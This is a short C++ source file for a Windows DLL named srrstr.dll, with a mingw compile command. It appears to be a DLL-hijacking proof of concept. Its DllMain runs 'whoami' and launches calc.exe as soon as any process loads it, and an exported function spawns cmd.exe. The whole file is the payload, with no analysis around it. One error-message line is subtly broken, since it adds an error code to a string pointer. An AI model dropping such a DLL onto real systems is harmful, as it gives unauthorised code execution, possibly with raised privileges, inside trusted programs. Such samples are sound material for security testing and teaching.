// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

// Export function
extern "C" __declspec(dllexport) void Dummy() {

    MessageBox(NULL, TEXT("Hello from a DLL exported function"), TEXT("Hi!"), MB_OK | MB_ICONINFORMATION);

    STARTUPINFOA si = {
      sizeof(STARTUPINFOA)
    };
    PROCESS_INFORMATION pi;
    LPCSTR appCmd = "C:\\Windows\\System32\\cmd.exe";

    // Start a "cmd.exe" child process 
    if (!CreateProcessA(appCmd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        MessageBox(NULL, TEXT("CreateProcessA() failed\n") + GetLastError(), TEXT("Error"), MB_OK | MB_ICONINFORMATION);
    }

}
